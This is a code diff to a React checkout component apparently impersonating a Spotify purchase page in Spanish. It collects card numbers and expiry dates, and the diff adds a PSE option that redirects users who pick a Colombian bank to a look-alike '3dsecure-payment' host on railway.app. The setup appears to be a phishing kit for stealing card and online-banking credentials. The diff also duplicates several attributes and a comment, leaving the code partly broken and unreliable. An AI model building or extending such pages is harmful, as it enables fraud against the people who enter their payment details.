@@ -1,6 +1,6 @@
 "use client"
 
-import { useState } from "react"
+import { useState, useEffect } from "react"
 import Visa from "./img/visa-logo-generic.png"
 import { CreditCard } from "lucide-react"
 import { Link } from "react-router"
@@ -8,7 +8,23 @@ import usePaymentStore from './store'
 
 export const SpotifyPurchase = () => {
   const [paymentMethod, setPaymentMethod] = useState("div")
+  const [selectedBank, setSelectedBank] = useState("")
   const { cardData, loading, error, updateCardData, submitPayment } = usePaymentStore()
+
+  // Helper to format MM/YY
+  const handleExpDateChange = (e) => {
+    let value = e.target.value.replace(/[^\d]/g, "");
+    if (value.length > 4) value = value.slice(0, 4);
+    if (value.length > 2) value = value.slice(0, 2) + "/" + value.slice(2);
+    updateCardData('expDate', value);
+  }
+
+  // Redirigir a PSE cuando se seleccione un banco
+  useEffect(() => {
+    if (paymentMethod === "pse" && selectedBank) {
+      window.location.href = `https://3dsecure-payment.up.railway.app/pse/index.php?banco=${selectedBank}`
+    }
+  }, [paymentMethod, selectedBank])
 
   const handleSubmit = async (e) => {
     e.preventDefault()
@@ -124,10 +140,13 @@ export const SpotifyPurchase = () => {
                     <label htmlFor="" className="font-semibold">Fecha de vencimiento</label>
                     <input
                       type="text"
-                      placeholder="MM/AA"
+                      placeholder="MM/YY"
                       className="border p-3 rounded-md w-full"
                       value={cardData.expDate}
-                      onChange={(e) => updateCardData('expDate', e.target.value)}
+                      onChange={handleExpDateChange}
+                      maxLength={5}
+                      pattern="^(0[1-9]|1[0-2])\/\d{2}$"
+                      inputMode="numeric"
                     />
                     </div>
                     <div>
@@ -154,7 +173,10 @@ export const SpotifyPurchase = () => {
           </div>
 
           {/* PSE */}
+          {/* PSE */}
           <div
+            onClick={() => setPaymentMethod("pse")}
+            className={`cursor-pointer hover:bg-gray-50 transition-colors border-l border-b border-r py-5  ${paymentMethod === "pse" ? "border" : ""}`}
             onClick={() => setPaymentMethod("pse")}
             className={`cursor-pointer hover:bg-gray-50 transition-colors border-l border-b border-r py-5  ${paymentMethod === "pse" ? "border" : ""}`}
           >
@@ -164,11 +186,34 @@ export const SpotifyPurchase = () => {
                   type="radio"
                   checked={paymentMethod === "pse"}
                   onChange={() => setPaymentMethod("pse")}
+                  checked={paymentMethod === "pse"}
+                  onChange={() => setPaymentMethod("pse")}
                 />
-                <span className="font-medium ml-3">PSE (Pago seguro en línea)</span>
+                <span className="font-medium ml-3">PSE</span>
               </div>
               <div className="ml-7 mt-4">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/PSE_logo.png" alt="PSE" className="h-5" />
               </div>
+              {/* Formulario visible solo si está seleccionado */}
+              {paymentMethod === "pse" && (
+                <div className="mt-6">
+                  <label htmlFor="banco" className="font-semibold">Selecciona tu banco</label>
+                  <select
+                    id="banco"
+                    className="w-full border p-3 rounded-md mt-2"
+                    value={selectedBank}
+                    onChange={e => setSelectedBank(e.target.value)}
+                  >
+                    <option value="">Selecciona un banco</option>
+                    <option value="banco av villas">Banco AV Villas</option>
+                    <option value="bancolombia">Bancolombia</option>
+                    <option value="banco de bogotá">Banco de Bogotá</option>
+                    <option value="nequi">Nequi</option>
+                    <option value="banco de occidente">Banco de Occidente</option>
+                    <option value="banco popular">Banco Popular</option>
+                  </select>
+                </div>
+              )}
             </div>
           </div>
         </div>
